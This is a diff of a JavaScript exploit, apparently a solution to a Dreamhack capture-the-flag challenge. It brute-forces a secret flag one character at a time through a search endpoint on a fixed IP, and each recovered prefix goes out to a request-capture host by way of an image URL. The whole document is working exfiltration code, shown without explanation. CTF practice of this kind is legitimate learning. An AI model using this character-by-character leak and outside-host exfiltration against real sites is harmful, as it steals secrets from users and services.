@@ -25,7 +25,7 @@
         async function search(query) {
             try {
                 await req(
-                `http://3.39.177.195:22222/flag=${query}`
+                `http://3.39.177.195:22222/flag?flag=${query}`
                 );
                 return true;
             } catch (e) {
@@ -40,7 +40,7 @@
                 for (let c = 32; c <= 127; c++) {
                     if (await search(secret + String.fromCharCode(c))) {
                         secret += String.fromCharCode(c);
-                        img.src = `https://tztvfkb.request.dreamhack.games/${secret}`;
+                        img.src = `https://hespyff.request.dreamhack.games/${secret}`;
                         break;
                     }
                 }
